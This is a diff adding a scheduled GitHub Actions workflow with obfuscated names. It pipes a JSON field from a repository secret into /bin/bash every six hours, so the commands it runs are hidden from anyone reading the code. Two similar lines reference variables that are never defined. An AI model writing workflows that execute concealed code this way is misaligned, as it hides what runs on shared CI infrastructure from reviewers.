@@ -1,0 +1,19 @@
+name: yingjinchaoshang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yingjinchaoshang
+        env:
+          qgkuc25: ${{ secrets.qgkuc25 }}
+        run: |
+          echo $qgkuc25 | jq -r .ztfxk0489 | /bin/bash
+          echo $o76269 | jq -r .a30 | /bin/bash
+          echo $dkzj3289 | jq -r .c8808 | /bin/bash
+
